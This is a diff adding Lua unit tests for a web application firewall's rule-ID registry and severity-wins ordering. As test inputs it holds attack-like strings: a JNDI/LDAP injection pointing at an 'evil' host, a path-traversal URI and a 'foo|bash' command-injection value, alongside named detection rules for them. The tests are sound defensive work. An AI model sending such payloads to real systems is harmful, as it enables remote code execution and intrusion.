@@ -228,6 +228,81 @@ do
   check(hits[1].ttl ~= nil, "12: hits — entry has ttl")
 end
 
+-- ── Test 13: get_rule_ids() exposes the registry; rule_id_for(key) lookups ───
+do
+  local ids = waf.get_rule_ids()
+  check(type(ids) == "table",                        "13: get_rule_ids — returns table")
+  check(ids.rule_traversal == 101,                   "13: ids — rule_traversal=101")
+  check(ids.rule_rce == 320,                         "13: ids — rule_rce=320")
+  check(ids.rule_proxy_header_sqli == 321,           "13: ids — rule_proxy_header_sqli=321")
+  check(ids.rule_xmlrpc_pingback == 511,             "13: ids — rule_xmlrpc_pingback=511")
+  check(ids.rule_cmd_payload_pipe_bash == 315,       "13: ids — rule_cmd_payload_pipe_bash=315")
+
+  -- Caller mutation must not leak into the live table.
+  ids.rule_traversal = 999
+  local ids2 = waf.get_rule_ids()
+  check(ids2.rule_traversal == 101,                  "13: ids — table is a copy, original intact")
+
+  check(waf.rule_id_for("rule_traversal") == 101,    "13: rule_id_for — known key returns ID")
+  check(waf.rule_id_for("rule_does_not_exist") == nil, "13: rule_id_for — unknown key returns nil")
+  check(waf.rule_id_for(nil) == nil,                 "13: rule_id_for — nil input returns nil")
+  check(waf.rule_id_for(42) == nil,                  "13: rule_id_for — non-string returns nil")
+end
+
+-- ── Test 14: hit entries carry waf_rule_id; 6th return value is the strongest ─
+do
+  disable_all_rules()
+  waf.set_rule("rule_rce", "block")
+
+  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
+    args = "x=${jndi:ldap://evil/}",
+  }))
+  check(hit == true,                                 "14: rce — hit=true")
+  check(waf_rule_id == 320,                          "14: rce — 6th return is rule_rce ID 320")
+  check(hits[1] and hits[1].waf_rule_id == 320,      "14: rce — hits[1].waf_rule_id == 320")
+end
+
+-- ── Test 15: severity-wins picks the strongest rule's ID, not first-match ────
+do
+  disable_all_rules()
+  waf.set_rule("rule_traversal", "logonly")  -- ID 101
+  waf.set_rule("rule_rce",       "block")     -- ID 320
+
+  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
+    uri  = "/foo/../",
+    args = "x=${jndi:ldap://",
+  }))
+  check(hit == true,                                 "15: combo — hit=true")
+  check(waf_rule_id == 320,                          "15: combo — final waf_rule_id is RCE (320), not TRAVERSAL (101)")
+  check(#hits == 2,                                  "15: combo — both hits recorded")
+  -- Iteration order at call sites: traversal records before RCE.
+  check(hits[1].waf_rule_id == 101,                  "15: combo — hits[1] is traversal (101)")
+  check(hits[2].waf_rule_id == 320,                  "15: combo — hits[2] is rce (320)")
+end
+
+-- ── Test 16: cmd_payload sub-rule IDs map per tag ─────────────────────────────
+do
+  disable_all_rules()
+  -- All cmd_payload variants default to "challenge" except backtick (logonly);
+  -- explicit set is defensive in case of CFG drift.
+  waf.set_rule("rule_cmd_payload",            "challenge")
+  waf.set_rule("rule_cmd_payload_pipe_bash",  "challenge")
+
+  local hit, _reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
+    args = "x=foo|bash",
+  }))
+  if hit then
+    check(waf_rule_id == 315,                        "16: cmd_payload pipe_bash — ID 315")
+  end
+  -- Tolerant pass: detector might match a different tag depending on
+  -- payload tokenisation; we just ensure that *if* it hit, the ID came from
+  -- the per-tag override map (any 311-317).
+  if hit and waf_rule_id ~= 315 then
+    check(waf_rule_id and waf_rule_id >= 311 and waf_rule_id <= 317,
+      "16: cmd_payload — fell back to a sibling tag ID in 311-317")
+  end
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
